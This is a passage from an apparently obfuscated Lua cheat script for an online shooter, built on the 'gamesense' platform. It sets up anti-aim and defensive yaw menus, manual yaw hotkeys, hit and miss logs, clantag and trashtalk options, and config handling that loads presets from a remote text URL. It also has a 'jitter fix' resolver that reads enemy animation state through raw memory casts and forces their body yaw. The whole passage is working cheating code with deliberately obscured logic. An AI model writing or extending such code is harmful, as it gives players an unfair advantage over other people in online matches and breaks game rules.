Color",v1.r,v1.g,v1.b,255),indicatorsStyle=ui.new_multiselect(v220,v221,"\n Elements","Name","State","Doubletap","Hideshots","Freestand","Safepoint","Body aim","Fakeduck"),arrows=ui.new_combobox(v220,v221,"Arrows","Disabled","TS","Default"),arrowClr=ui.new_color_picker(v220,v221,"Arrow Color",v1.r,v1.g,v1.b,91 + 164 ),watermarkMenu=ui.new_combobox(v220,v221,"Watermark","Disabled","LS"),watermarkClr2=ui.new_color_picker(v220,v221,"Watermark Color",v1.r,v1.g,v1.b,1063 -(329 + 479) ),minDmgIndicator2=ui.new_combobox(v220,v221,"Minimum Damage Indicator","Disabled","Bind","Always on"),logs=ui.new_multiselect(v220,v221,"Logs","On screen","Console"),logsClr=ui.new_color_picker(v220,v221,"Logs Color",v1.r,v1.g,v1.b,1109 -(174 + 680) ),logOffset=ui.new_slider(v220,v221,"› Offset",0 -0 ,1450 -750 ,115 + 45 ,true,"px",740 -(396 + 343) ),space3=ui.new_label(v220,v221,"\n")},miscTab={miscmenushka=ui.new_multiselect(v220,v221,"\nTaadssadadasdadasdsadasdasda","Clantag","Trashtalk","Fast Ladder","Animation Breaker",v212.hex({1647 -(29 + 1448) ,640 -470 ,64 + 32 })   .. "Jitter Fix *WIP*" ,v212.hex({1697 -(389 + 1138) ,161 + 9 ,96})   .. "Network Fix *WIP*" ,v212.hex({159 + 11 ,170,170 -74 })   .. "Defensive Fix *WIP*" ),trashTalk=ui.new_checkbox(v220,v221,"Trashtalk"),air_stop=ui.new_checkbox(v220,v221,"Air stop"),air_stop_k=ui.new_hotkey(v220,v221,"Air stop",true),fastLadderEnabled=ui.new_checkbox(v220,v221,"Fast ladder"),fastLadder=ui.new_multiselect(v220,v221,"\n fast ladder","Up","Down"),animationsEnabled=ui.new_checkbox(v220,v221,"Animation Breakers"),animations=ui.new_multiselect(v220,v221,"\n animation breakers","Backward Legs","In air","0 Pitch on land","Leg fucker","Moonwalking","Walking in Air","Freezed legs","Earthquake"),jitterFixEnabled=ui.new_checkbox(v220,v221,v212.hex({1634 -(157 + 1307) ,170,11 + 85 })   .. "Jitter Fix *WIP*" ),jitterFix=ui.new_combobox(v220,v221,"\n jitterfix","Recommended","By One Side","By Two Side","By Delta"),jitterFixOffset=ui.new_slider(v220,v221,"› Offset",1 -0 ,4 + 6 ,3,true,"t",2 -1 ),jitterwarning3=ui.new_label(v220,v221,v212.hex({11 + 159 ,4 + 166 ,148 -52 })   .. "May accures a delay!" ),jitterwarning4=ui.new_label(v220,v221,"\nZaebal"),jitterwarning=ui.new_label(v220,v221,v212.hex({474 -(300 + 4) ,170,458 -(112 + 250) })   .. "You're ping needed be lower than 85ms" ),jitterwarning2=ui.new_label(v220,v221,v212.hex({425 -255 ,88 + 82 ,72 + 24 })   .. "Or you will get a negative experience" )},configTab={list=ui.new_listbox(v220,v221,"Configs",""),name=ui.new_textbox(v220,v221,"Config name",""),load=ui.new_button(v220,v221,"Load",function() end),save=ui.new_button(v220,v221,"Save",function() end),delete=ui.new_button(v220,v221,"Delete",function() end),import=ui.new_button(v220,v221,"Import",function() end),export=ui.new_button(v220,v221,"Export",function() end)}};local v225={};local v226={};for v495=1, #v205.aaStates do v226[v495]=v212.hex({200,1614 -(1001 + 413) ,1082 -(244 + 638) })   .. "("   .. v212.hex({661 -439 ,1961 -(1665 + 241) ,772 -(373 + 344) })   .. ""   .. v205.pStates[v495]   .. ""   .. v212.hex({53 + 147 ,338 -138 ,146 + 54 })   .. ")"   .. v212.hex({1 + 154 ,1391 -(298 + 938) ,155})   .. " " ;v225[v495]={enableState=ui.new_checkbox(v220,v221,"Redefine "   .. v212.hex({170,1836 -(636 + 1030) ,94 + 2 })   .. v205.aaStates[v495]   .. v212.hex({14 + 186 ,421 -(55 + 166) ,39 + 161 })   .. " Condition" ),pitch=ui.new_combobox(v220,v221,"Pitch\n"   .. v226[v495] ,"Off","Default","Up","Down","Minimal","Random","Custom"),pitchSlider=ui.new_slider(v220,v221,"\nPitch add"   .. v226[v495] , -89,9 + 80 ,0 -0 ,true,"°",298 -(36 + 261) ),yawBase=ui.new_combobox(v220,v221,"Yaw base\n"   .. v226[v495] ,"Local view","At targets"),yaw=ui.new_combobox(v220,v221,"Yaw\n"   .. v226[v495] ,"Off","180","Spin","180 Z"),yawCondition=ui.new_combobox(v220,v221,"Yaw condition\n"   .. v226[v495] ,"Static","L & R","Slow Jitter"),yawStatic=ui.new_slider(v220,v221,"\nyaw limit"   .. v226[v495] , -180,180,0,true,"°",1 -0 ),yawLeft=ui.new_slider(v220,v221,"Left\nyaw"   .. v226[v495] , -(1548 -(34 + 1334)),70 + 110 ,0,true,"°",1 + 0 ),yawRight=ui.new_slider(v220,v221,"Right\nyaw"   .. v226[v495] , -180,1463 -(1035 + 248) ,21 -(20 + 1) ,true,"°",1 + 0 ),yawSpeed=ui.new_slider(v220,v221,"Yaw Ticks\nyaw"   .. v226[v495] ,322 -(134 + 185) ,16,1139 -(549 + 584) ,0),yawJitter=ui.new_combobox(v220,v221,"Yaw jitter\n"   .. v226[v495] ,"Off","Offset","Center","3-Way","Random"),yawJitterCondition=ui.new_combobox(v220,v221,"Yaw jitter condition\n"   .. v226[v495] ,"Static","L & R"),yawJitterStatic=ui.new_slider(v220,v221,"\nyaw jitter limit"   .. v226[v495] , -(865 -(314 + 371)),180,0,true,"°",1),yawJitterLeft=ui.new_slider(v220,v221,"Left\nyaw jitter"   .. v226[v495] , -(617 -437),1148 -(478 + 490) ,0 + 0 ,true,"°",1173 -(786 + 386) ),yawJitterRight=ui.new_slider(v220,v221,"Right\nyaw jitter"   .. v226[v495] , -(583 -403),180,1379 -(1055 + 324) ,true,"°",1),yawJitterDisablers=ui.new_multiselect(v220,v221,"Jitter disablers\n"   .. v226[v495] ,"Head safety","Height advantage"),bodyYaw=ui.new_combobox(v220,v221,"Body yaw\n"   .. v226[v495] ,"Off","Opposite","Jitter","Static"),bodyYawSlider=ui.new_slider(v220,v221,"\nbody yaw limit"   .. v226[v495] , -(1520 -(1093 + 247)),160 + 20 ,0 + 0 ,true,"°",1),defensiveOpt=ui.new_combobox(v220,v221,"Defensive options\n"   .. v226[v495] ,"-","Elusive mode","Always on","Always on Tick"),defensiveOptSlider=ui.new_slider(v220,v221,"\nDefensiveOptSlider"   .. v226[v495] ,11 -8 ,169 -119 ,0 -0 ,true,"t",2 -1 ),defensiveYaw=ui.new_combobox(v220,v221,"Defensive yaw\n"   .. v226[v495] ,"-","Random","Spin","Side-ways","Flick","Custom","Backward Jitter"),defensiveYawSlider=ui.new_slider(v220,v221,"\nDefensiveYawSlider"   .. v226[v495] , -(65 + 115),180,0,true,"",1),defensiveYawSlider2=ui.new_slider(v220,v221,"\nDefensiveYawSlider2"   .. v226[v495] , -180,693 -513 ,0 -0 ,true,"",1),defensivePitch=ui.new_combobox(v220,v221,"Defensive pitch\n"   .. v226[v495] ,"-","Custom","Random","Jitter"),defensivePitchSlider=ui.new_slider(v220,v221,"\nDefensivePitchSlider"   .. v226[v495] , -89,68 + 21 ,0 -0 ,true,"°",689 -(364 + 324) ),defensivePitchSlider2=ui.new_slider(v220,v221,"\nDefensivePitchSlider"   .. v226[v495] , -(243 -154),213 -124 ,0 + 0 ,true,"°",1)};end local function v227(v498) local v499=0 -0 ;local v500;while true do if (v499==(1 -0)) then for v1041,v1042 in pairs(v203) do if (v1042.name==v498) then return {config=v1042.config,index=v1041};end end return false;end if (v499==(0 -0)) then v500=v500.read(v201.database.configs) or {} ;for v1043,v1044 in pairs(v500) do if (v1044.name==v498) then return {config=v1044.config,index=v1043};end end v499=1269 -(1249 + 19) ;end end end local function v228(v501) local v502=database.read(v201.database.configs) or {} ;local v503={};if (v501:match("[^%w]")~=nil) then return;end for v816,v817 in pairs(v205.pStates) do local v818=0 + 0 ;while true do if (v818==(0 -0)) then v503[v817]={};for v1108,v1109 in pairs(v225[v816]) do v503[v817][v1108]=ui.get(v1109);end break;end end end local v504=v227(v501);if  not v504 then table.insert(v502,{name=v501,config=v503});else v502[v504.index].config=v503;end database.write(v201.database.configs,v502);end local function v229(v505) local v506=1086 -(686 + 400) ;local v507;while true do if (v506==0) then v507=database.read(v201.database.configs) or {} ;for v1046,v1047 in pairs(v507) do if (v1047.name==v505) then table.remove(v507,v1046);break;end end v506=1;end if (v506==(1 + 0)) then for v1048,v1049 in pairs(v203) do if (v1049.name==v505) then return false;end end database.write(v201.database.configs,v507);break;end end end local function v230() local v508=database.read(v201.database.configs) or {} ;local v509={};for v819,v820 in pairs(v203) do table.insert(v509,v820.name);end for v821,v822 in pairs(v508) do table.insert(v509,v822.name);end return v509;end local function v231(v510) if (type(v510)~="string") then return v510;end local v511=v510:lower();if (v511=="true") then return true;elseif (v511=="false") then return false;elseif (tonumber(v511)~=nil) then return tonumber(v511);else return tostring(v510);end end local v232=v4("gamesense/inspect");local function v233(v512) for v823,v824 in pairs(v205.pStates) do for v906,v907 in pairs(v225[v823]) do if (v512[v824][v906]~=nil) then ui.set(v907,v512[v824][v906]);end end end end local v234="base64";local function v235() local v513=0;local v514;local v515;local v516;while true do if (v513==(229 -(73 + 156))) then v514=v11.get();v515=v7.decode(v514,v234);v513=1 + 0 ;end if (v513==1) then v516=json.parse(v515);v233(v516.config);break;end end end local function v236(v517) local v518=v227(v517);local v519=json.stringify(v518);local v520=v7.encode(v519,v234);v11.set(v520);end local function v237(v521) local v522=811 -(721 + 90) ;local v523;while true do if (v522==(0 + 0)) then v523=v227(v521);v233(v523.config);break;end end end local function v238() if (database.read(v201.database.configs)==nil) then database.write(v201.database.configs,{});end local v524="https://text.is/O6L3/raw";v60.get(v524,function(v825,v826) local v827=0 -0 ;local v828;while true do if (v827==0) then if  not v825 then local v1144=470 -(224 + 246) ;while true do if ((0 -0)==v1144) then print("Failed to get presets");return;end end end v828=json.parse(v826.body);v827=1 -0 ;end if (v827==(1 + 0)) then for v1111,v1112 in pairs(v828.presets) do table.insert(v203,{name="*"   .. v1112.name ,config=v1112.config});ui.set(v224.configTab.name,"*"   .. v1112.name );end ui.update(v224.configTab.list,v230());break;end end end);end v238();local function v239(v525) while v525>(5 + 175)  do v525=v525-(265 + 95) ;end while v525< -(357 -177)  do v525=v525 + (1198 -838) ;end return v525;end local function v240(v526) local v527=513 -(203 + 310) ;local v528;local v529;local v530;while true do if (v527==(1993 -(1238 + 755))) then if  not ui.get(v224.miscTab.jitterFixEnabled) then return;end if  not v526 then return;end v527=1 + 0 ;end if (v527==(1535 -(709 + 825))) then v528=v189.cast("void***",v186(v184,v526));v529=v189.cast("char*",v528) + (72354 -33090) ;v527=2;end if (v527==(2 -0)) then v530=v189.cast("struct c_animstate**",v529)[864 -(196 + 668) ];return v530;end end end local v241=3 -2 ;local v242="none";local v243= -1;local v244= -(1 -0);local function v245(v531) local v532=833 -(171 + 662) ;local v533;local v534;local v535;local v536;local v537;while true do if (v532==(94 -(4 + 89))) then v535=entity.get_prop(v531,"m_angEyeAngles[1]") -entity.get_prop(v531,"m_flPoseParameter",11) ;v241=v533.m_flEyeYaw;v242=entity.get_player_name(v531);v532=2;end if ((0 -0)==v532) then if  not ui.get(v224.miscTab.jitterFixEnabled) then return;end v533=v240(v531);v534=v186(v184,v531);v532=1 + 0 ;end if (v532==3) then v244=(globals.tickcount()%(13 -10)) -(1 + 0) ;if (ui.get(v224.miscTab.jitterFix)=="By One Side") then v536=v535 * v537 * v533.m_flPlaybackRate ;elseif (ui.get(v224.miscTab.jitterFix)=="Recommended") then v536=v243 * math.abs(v535 * v537 * v533.m_flPlaybackRate ) ;elseif (ui.get(v224.miscTab.jitterFix)=="By Two Side") then v536=v244 * math.abs(v535 * v537 * v533.m_flPlaybackRate ) ;else v536=(v535 * v537 * v533.m_flPlaybackRate)/ui.get(v224.miscTab.jitterFixOffset) ;end v536=v239(v536);v532=1490 -(35 + 1451) ;end if (v532==(1457 -(28 + 1425))) then plist.set(v531,"Force body yaw",true);plist.set(v531,"Force body yaw value",v536);break;end if (v532==(1995 -(941 + 1052))) then v536=nil;v537=((entity.get_prop(v531,"m_flPoseParameter",11) or 1) * 116) -(56 + 2) ;v243=(((globals.tickcount()%2)==(1515 -(822 + 692))) and  -(1 -0)) or (1 + 0) ;v532=3;end end end local function v246(v538) if ui.get(v224.miscTab.jitterFixEnabled) then if (entity.is_dormant(v538) or entity.get_prop(v538,"m_bDormant")) then return;end v245(v538);else plist.set(v538,"Force body yaw",false);end end local function v247() local v539=0;local v540;while true do if ((297 -(45 + 252))==v539) then if  not ui.get(v224.miscTab.jitterFixEnabled) then return;end v540=entity.get_players(true);v539=1 + 0 ;end if (v539==(1 + 0)) then for v1050,v1051 in ipairs(v540) do if (v1051 and entity.is_alive(v1051)) then v246(v1051);end end break;end end end local v248=0.5 -0 ;local v249=439 -(114 + 319) ;local v250={};local v251={new=function(v541,v542,v543,v544) local v545=0 -0 ;local v546;while true do if ((1 -0)==v545) then for v1052= #v250,1 + 0 , -(1 -0) do local v1053=0 -0 ;local v1054;while true do if (v1053==(1963 -(556 + 1407))) then v1054=v250[v1052];if (((( #v250-v1052) + (1207 -(741 + 465)))>v249) and (((v1054.time + v546) -globals.curtime())>0)) then v1054.time=globals.curtime() -v546 ;end break;end end end break;end if (v545==0) then table.insert(v250,{time=globals.curtime(),string=v541,color={v542,v543,v544,235 + 20 },fraction=0});v546=5;v545=2 -1 ;end end end,render=function() local v547,v548=client.screen_size();local v549={};local v550=0;for v829=1, #v250 do local v830=v250[v829];local v831={rounding=5 + 1 ,size=5.5,glow=10,time=2.5 + 0 };if (((v830.time + v831.time) -globals.curtime())>(0 + 0)) then v830.fraction=v212.clamp(v830.fraction + (globals.frametime()/v248) ,1230.01 -(957 + 273) ,1 + 0 );else v830.fraction=v212.clamp(v830.fraction-(globals.frametime()/v248) ,0.01,1 + 0 );end if ((v830.fraction<=(0 -0)) and (((v830.time + v831.time) -globals.curtime())<=(0 -0))) then table.insert(v549,v829);end local v832=v212.easeInOut(v830.fraction);local v833,v834,v835,v836=unpack(v830.color);local v837=v215(v830.string,v833,v834,v835,v836 * v832 );local v838,v839=renderer.measure_text("",v837);local v840=renderer.measure_text("b","");local v841,v842=7,v831.size;local v843=ui.get(v224.visualsTab.logOffset);v550=v550 + ((v839 + (v842 * 2) + (math.sqrt(v831.glow/(183 -123) ) * (49 -39)) + (1785 -(389 + 1391))) * v832) ;v216(((v547/(2 + 0)) -((v838 + v840)/2)) -v841 ,(((v548-v843) -(v839/(1 + 1))) -v842) -v550 ,v838 + v840 + (v841 * (4 -2)) ,v839 + (v842 * 2) ,v831.glow,v831.rounding,{v833,v834,v835,(356 -(309 + 2)) * v832 },{1237 -(1090 + 122) ,83 -58 ,25,(1373 -(628 + 490)) * v832 });renderer.text((v547/2) + (v840/2) ,(v548-v843) -v550 ,46 + 209 ,255,631 -376 ,(1165 -910) * v832 ,"c",0,v837);end for v844= #v549,1, -(775 -(431 + 343)) do table.remove(v250,v549[v844]);end end,clear=function() v250={};end};local function v252(v551) local v552=v205.hitgroup_names[v551.hitgroup + (1 -0) ] or "?" ;local v553,v554,v555,v556=ui.get(v224.visualsTab.logsClr);if (entity.get_prop(v551.target,"m_iHealth")==(0 -0)) then v251.new(string.format(" Killed $%s$ in $%s$ for $%d$"   .. "! " ,entity.get_player_name(v551.target),v552:lower(),v551.damage),v553,v554,v555);else v251.new(string.format(" Hit $%s$ in $%s$ for $%d$"   .. "! " ,entity.get_player_name(v551.target),v552:lower(),v551.damage),v553,v554,v555);end end local function v253(v557) local v558=0 + 0 ;local v559;local v560;local v561;local v562;local v563;while true do if (v558==(0 + 0)) then v559=v205.hitgroup_names[v557.hitgroup + (1696 -(556 + 1139)) ] or "?" ;v560,v561,v562,v563=ui.get(v224.visualsTab.logsClr);v558=16 -(6 + 9) ;end if (v558==1) then v557.reason=((v557.reason=="?") and "resolver") or v557.reason ;v251.new(string.format(" Missed $%s's$ $%s$ due to $%s$"   .. "" ,entity.get_player_name(v557.target),v559:lower(),v557.reason),v560,v561,v562);break;end end end local v254={ignore=false,manualAA=0 + 0 ,input=0 + 0 };client.set_event_callback("player_connect_full",function() local v564=169 -(28 + 141) ;while true do if ((0 + 0)==v564) then v254.ignore=false;v254.manualAA=0 -0 ;v564=1;end if (v564==(1 + 0)) then v254.input=globals.curtime();break;end end end);local v255={steam=v14.ISteamFriends,prev_ct="",orig_ct="",enb=false};local function v256() local v565=0;local v566;local v567;while true do if (v565==0) then v566=cvar.cl_clanid.get_int();if (v566==(1317 -(486 + 831))) then return "\0";end v565=1;end if (v565==1) then v567=v255.steam.GetClanCount();for v1055=0,v567 do local v1056=v255.steam.GetClanByIndex(v1055);if (v1056==v566) then return v255.steam.GetClanTag(v1056);end end break;end end end v251.new(string.format(" Welcome, $%s$"   .. "! " ,v200.username:lower()),v1.r,v1.g,v1.b);local v257=function(v568,v569,v570,v571,v572,v573) local v574=0 -0 ;local v575;local v576;local v577;local v578;local v579;local v580;local v581;local v582;while true do if (v574==(10 -7)) then v581=v578.b-v572 ;v582=v578.a-v573 ;v574=1 + 3 ;end if (v574==(0 -0)) then v575,v576={},1;v577=v569:len() -(1264 -(668 + 595)) ;v574=1;end if (v574==(2 + 0)) then v579=v578.r-v570 ;v580=v578.g-v571 ;v574=1 + 2 ;end if (v574==4) then for v1057=2 -1 , #v569 do local v1058=((v1057-1)/( #v569-(291 -(23 + 267)))) + v568 ;v575[v576]="\a"   .. v212.RGBAtoHEX(v570 + (v579 * math.abs(math.cos(v1058))) ,v571 + (v580 * math.abs(math.cos(v1058))) ,v572 + (v581 * math.abs(math.cos(v1058))) ,v573 + (v582 * math.abs(math.cos(v1058))) ) ;v575[v576 + (1945 -(1129 + 815)) ]=v569:sub(v1057,v1057);v576=v576 + (389 -(371 + 16)) ;end return v575;end if (v574==(1751 -(1326 + 424))) then v578={};v578.r,v578.g,v578.b,v578.a=ui.get(v224.visualsTab.BackgroundColor);v574=3 -1 ;end end end;local v258=function(v583,v584,v585,v586,v587,v588) local v589=0 -0 ;local v590;local v591;local v592;local v593;local v594;local v595;local v596;while true do if (v589==0) then v590,v591={},1;v592=v584:len() -(119 -(88 + 30)) ;v589=772 -(720 + 51) ;end if (v589==(6 -3)) then for v1061=1, #v584 do local v1062=((v1061-1)/( #v584-(1777 -(421 + 1355)))) + v583 ;v590[v591]="\a"   .. v212.RGBAtoHEX(v585 + (v593 * math.abs(math.cos(v1062))) ,v586 + (v594 * math.abs(math.cos(v1062))) ,v587 + (v595 * math.abs(math.cos(v1062))) ,v588 + (v596 * math.abs(math.cos(v1062))) ) ;v590[v591 + (1 -0) ]=v584:sub(v1061,v1061);v591=v591 + 2 ;end return v590;end if (v589==(1 + 0)) then v593=(1242 -(286 + 797)) -v585 ;v594=(738 -536) -v586 ;v589=2 -0 ;end if (v589==(441 -(397 + 42))) then v595=(14 + 29) -v587 ;v596=255 -v588 ;v589=803 -(24 + 776) ;end end end;client.set_event_callback("setup_command",function(v597) local v598=0 -0 ;local v599;while true do if (v598==1) then if ui.get(v224.miscTab.air_stop) then if ui.get(v224.miscTab.air_stop_k) then if v597.quick_stop then if ((globals.tickcount() -ticks)>(788 -(222 + 563))) then v597.in_speed=1;end else ticks=globals.tickcount();end end end break;end if (v598==(0 -0)) then v599=entity.get_local_player();if  not v599 then return;end v598=1 + 0 ;end end end);local v259=v212.time_to_ticks(globals.realtime());client.set_event_callback("setup_command",function(v600) v205.localPlayer=entity.get_local_player();if ( not v205.localPlayer or  not entity.is_alive(v205.localPlayer) or  not ui.get(v222)) then return;end local v602=entity.get_prop(v205.localPlayer,"m_fFlags");local v603=(v6.band(v602,191 -(23 + 167) )~=(1798 -(690 + 1108))) and (v600.in_jump==(0 + 0)) ;local v604=entity.get_prop(entity.get_game_rules(),"m_bIsValveDS");local v605=v3(entity.get_prop(v205.localPlayer,"m_vecOrigin"));local v606=v3(entity.get_prop(v205.localPlayer,"m_vecVelocity"));local v607=v3(client.camera_angles());local v608=v3(client.eye_position());local v609=math.sqrt((v606.x * v606.x) + (v606.y * v606.y) + (v606.z * v606.z) );local v610=entity.get_player_weapon();local v611=math.sqrt((v606.x^(2 + 0)) + (v606.y^(850 -(40 + 808))) )<5 ;local v612=(entity.get_prop(v205.localPlayer,"m_flPoseParameter",2 + 9 ) * (458 -338)) -(58 + 2) ;local v610=entity.get_player_weapon(v205.localPlayer);local v613=ui.get(v204.slow[1 + 0 ]) and ui.get(v204.slow[2 + 0 ]) ;local v614=ui.get(v204.os[572 -(47 + 524) ]) and ui.get(v204.os[2 + 0 ]) ;local v615=ui.get(v204.fakeDuck);local v616=ui.get(v204.dt[2 -1 ]) and ui.get(v204.dt[2]) ;local v617=ui.get(v225[11 -3 ].enableState) and client.key_state(69) ;local v618=(v212.defensive.defensive>(2 -1)) and (v212.defensive.defensive<(1740 -(1165 + 561))) ;local v619=entity.get_classname(v610)=="CKnife" ;v205.pState=1 + 0 ;if v611 then v205.pState=6 -4 ;end if  not v611 then v205.pState=2 + 1 ;end if v613 then v205.pState=483 -(341 + 138) ;end if (entity.get_prop(v205.localPlayer,"m_flDuckAmount")>(0.1 + 0)) then v205.pState=10 -5 ;end if  not v603 then v205.pState=332 -(89 + 237) ;end if ( not v603 and (entity.get_prop(v205.localPlayer,"m_flDuckAmount")>(0.1 -0))) then v205.pState=14 -7 ;end if ((ui.get(v225[v205.pState].enableState)==false) and (v205.pState~=(882 -(581 + 300)))) then v205.pState=1221 -(855 + 365) ;end if (v617 and  not v205.should_disable) then v205.pState=8;end local v621=entity.get_prop(v205.localPlayer,"m_flNextAttack");local v622=entity.get_prop(entity.get_player_weapon(v205.localPlayer),"m_flNextPrimaryAttack");local v623=false;local v624=ui.get(ui.reference("AA","Fake lag","Enabled"));if (v622~=nil) then v623= not (math.max(v622,v621)>globals.curtime());end local v625=4 -2 ;if (v600.chokedcommands==(0 + 0)) then v205.choke1=v205.choke1 + (1236 -(1030 + 205)) ;v205.choke2=v205.choke2 + 1 + 0 ;v205.choke3=v205.choke3 + 1 + 0 ;v205.choke4=v205.choke4 + (287 -(156 + 130)) ;end if (v205.choke1>=5) then v205.choke1=0 -0 ;end if (v205.choke2>=(13 -5)) then v205.choke2=0 -0 ;end if (v205.choke3>=8) then v205.choke3=2 + 3 ;end if ((globals.tickcount()%ui.get(v225[v205.pState].yawSpeed))==(1 + 0)) then v205.switch= not v205.switch;end if ((globals.tickcount()%2)==(70 -(10 + 59))) then v205.switch2= not v205.switch2;end local v626=client.random_int(2,3 + 5 );if ((globals.tickcount()%v626)==(4 -3)) then v205.switch3= not v205.switch3;end if (globals.tickcount()%(1165 -(671 + 492))) then client.delay_call(1 + 0 ,function() v205.switch4= not v205.switch4;end);end local v627=globals.tickcount();local v628=((v612>(1215 -(369 + 846))) and (1 + 0)) or  -(1 + 0) ;local v629=v212.includes(ui.get(v224.aaTab.aamenushka),"Static on manuals");ui.set(v224.aaTab.manualTab.manualLeft,"On hotkey");ui.set(v224.aaTab.manualTab.manualRight,"On hotkey");ui.set(v224.aaTab.manualTab.manualReset,"On hotkey");ui.set(v224.aaTab.manualTab.manualForward,"On hotkey");if ((v254.input + (1945.182 -(1036 + 909)))<globals.curtime()) then if (v254.manualAA==(0 + 0)) then if ui.get(v224.aaTab.manualTab.manualLeft) then v254.manualAA=1;v254.input=globals.curtime();if  not client.key_state(115 -46 ) then ui.set(v204.pitch[204 -(11 + 192) ],ui.get(v225[v205.pState].pitch));ui.set(v204.pitch[2 + 0 ],ui.get(v225[v205.pState].pitchSlider));end elseif ui.get(v224.aaTab.manualTab.manualRight) then local v1175=0;while true do if (0==v1175) then v254.manualAA=2;v254.input=globals.curtime();v1175=176 -(135 + 40) ;end if (v1175==1) then if  not client.key_state(166 -97 ) then ui.set(v204.pitch[1],ui.get(v225[v205.pState].pitch));ui.set(v204.pitch[2 + 0 ],ui.get(v225[v205.pState].pitchSlider));end break;end end elseif ui.get(v224.aaTab.manualTab.manualForward) then local v1208=0;while true do if (v1208==(0 -0)) then v254.manualAA=4 -1 ;v254.input=globals.curtime();v1208=177 -(50 + 126) ;end if ((2 -1)==v1208) then if  not client.key_state(16 + 53 ) then local v1291=0;while true do if ((1413 -(1233 + 180))==v1291) then ui.set(v204.pitch[970 -(522 + 447) ],ui.get(v225[v205.pState].pitch));ui.set(v204.pitch[1423 -(107 + 1314) ],ui.get(v225[v205.pState].pitchSlider));break;end end end break;end end elseif ui.get(v224.aaTab.manualTab.manualReset) then v254.manualAA=0 + 0 ;v254.input=globals.curtime();if  not client.key_state(69) then ui.set(v204.pitch[2 -1 ],ui.get(v225[v205.pState].pitch));ui.set(v204.pitch[1 + 1 ],ui.get(v225[v205.pState].pitchSlider));end end elseif (v254.manualAA==(1 -0)) then if ui.get(v224.aaTab.manualTab.manualRight) then v254.manualAA=7 -5 ;v254.input=globals.curtime();if  not client.key_state(1979 -(716 + 1194) ) then local v1209=0;while true do if ((0 + 0)==v1209) then ui.set(v204.pitch[1],ui.get(v225[v205.pState].pitch));ui.set(v204.pitch[2],ui.get(v225[v205.pState].pitchSlider));break;end end end elseif ui.get(v224.aaTab.manualTab.manualForward) then local v1210=0 + 0 ;while true do if (v1210==1) then if  not client.key_state(572 -(74 + 429) ) then local v1292=0 -0 ;while true do if (v1292==(0 + 0)) then ui.set(v204.pitch[2 -1 ],ui.get(v225[v205.pState].pitch));ui.set(v204.pitch[2 + 0 ],ui.get(v225[v205.pState].pitchSlider));break;end end end break;end if (v1210==(0 -0)) then v254.manualAA=3;v254.input=globals.curtime();v1210=1;end end elseif ui.get(v224.aaTab.manualTab.manualLeft) then local v1256=0 -0 ;while true do if (v1256==(434 -(279 + 154))) then if  not client.key_state(847 -(454 + 324) ) then local v1303=0 + 0 ;while true do if (v1303==0) then ui.set(v204.pitch[18 -(12 + 5) ],ui.get(v225[v205.pState].pitch));ui.set(v204.pitch[2 + 0 ],ui.get(v225[v205.pState].pitchSlider));break;end end end break;end if (v1256==(0 -0)) then v254.manualAA=0 + 0 ;v254.input=globals.curtime();v1256=1;end end elseif ui.get(v224.aaTab.manualTab.manualReset) then v254.manualAA=1093 -(277 + 816) ;v254.input=globals.curtime();if  not client.key_state(69) then local v1298=0;while true do if ((0 -0)==v1298) then ui.set(v204.pitch[1184 -(1058 + 125) ],ui.get(v225[v205.pState].pitch));ui.set(v204.pitch[2],ui.get(v225[v205.pState].pitchSlider));break;end end end end elseif (v254.manualAA==(1 + 1)) then if ui.get(v224.aaTab.manualTab.manualLeft) then v254.manualAA=976 -(815 + 160) ;v254.input=globals.curtime();if  not client.key_state(295 -226 ) then ui.set(v204.pitch[2 -1 ],ui.get(v225[v205.pState].pitch));ui.set(v204.pitch[2],ui.get(v225[v205.pState].pitchSlider));end elseif ui.get(v224.aaTab.manualTab.manualForward) then v254.manualAA=1 + 2 ;v254.input=globals.curtime();if  not client.key_state(69) then ui.set(v204.pitch[2 -1 ],ui.get(v225[v205.pState].pitch));ui.set(v204.pitch[1900 -(41 + 1857) ],ui.get(v225[v205.pState].pitchSlider));end elseif ui.get(v224.aaTab.manualTab.manualRight) then local v1282=1893 -(1222 + 671) ;while true do if (v1282==(0 -0)) then v254.manualAA=0 -0 ;v254.input=globals.curtime();v1282=1183 -(229 + 953) ;end if (v1282==(1775 -(1111 + 663))) then if  not client.key_state(1648 -(874 + 705) ) then ui.set(v204.pitch[1],ui.get(v225[v205.pState].pitch));ui.set(v204.pitch[1 + 1 ],ui.get(v225[v205.pState].pitchSlider));end break;end end elseif ui.get(v224.aaTab.manualTab.manualReset) then v254.manualAA=0 + 0 ;v254.input=globals.curtime();if  not client.key_state(69) then ui.set(v204.pitch[1 -0 ],ui.get(v225[v205.pState].pitch));ui.set(v204.pitch[1 + 1 ],ui.get(v225[v205.pState].pitchSlider));end end elseif (v254.manualAA==(682 -(642 + 37))) then if ui.get(v224.aaTab.manualTab.manualForward) then local v1259=0 + 0 ;while true do if ((1 + 0)==v1259) then if  not client.key_state(69) then ui.set(v204.pitch[2 -1 ],ui.get(v225[v205.pState].pitch));ui.set(v204.pitch[2],ui.get(v225[v205.pState].pitchSlider));end break;end if ((454 -(233 + 221))==v1259) then v254.manualAA=0 -0 ;v254.input=globals.curtime();v1259=1 + 0 ;end end elseif ui.get(v224.aaTab.manualTab.manualLeft) then local v1283=1541 -(718 + 823) ;while true do if (v1283==(1 + 0)) then if  not client.key_state(874 -(266 + 539) ) then ui.set(v204.pitch[2 -1 ],ui.get(v225[v205.pState].pitch));ui.set(v204.pitch[1227 -(636 + 589) ],ui.get(v225[v205.pState].pitchSlider));end break;end if (v1283==(0 -0)) then v254.manualAA=1 -0 ;v254.input=globals.curtime();v1283=1 + 0 ;end end elseif ui.get(v224.aaTab.manualTab.manualRight) then v254.manualAA=2;v254.input=globals.curtime();if  not client.key_state(69) then ui.set(v204.pitch[1 + 0 ],ui.get(v225[v205.pState].pitch));ui.set(v204.pitch[1017 -(657 + 358) ],ui.get(v225[v205.pState].pitchSlider));end elseif ui.get(v224.aaTab.manualTab.manualReset) then v254.manualAA=0 -0 ;v254.input=globals.curtime();if  not client.key_state(156 -87 ) then ui.set(v204.pitch[1188 -(1151 + 36) ],ui.get(v225[v205.pState].pitch));ui.set(v204.pitch[2 + 0 ],ui.get(v225[v205.pState].pitchSlider));end end end if ((v254.manualAA==(1 + 0)) or (v254.manualAA==(5 -3)) or (v254.manualAA==(1835 -(1552 + 280)))) then v254.ignore=true;if v629 then local v1147=0;while true do if (v1147==1) then ui.set(v204.bodyYaw[1],"Static");ui.set(v204.bodyYaw[2], -(1014 -(64 + 770)));v1147=2 + 0 ;end if (v1147==0) then ui.set(v204.yawJitter[1],"Off");ui.set(v204.yawJitter[4 -2 ],0 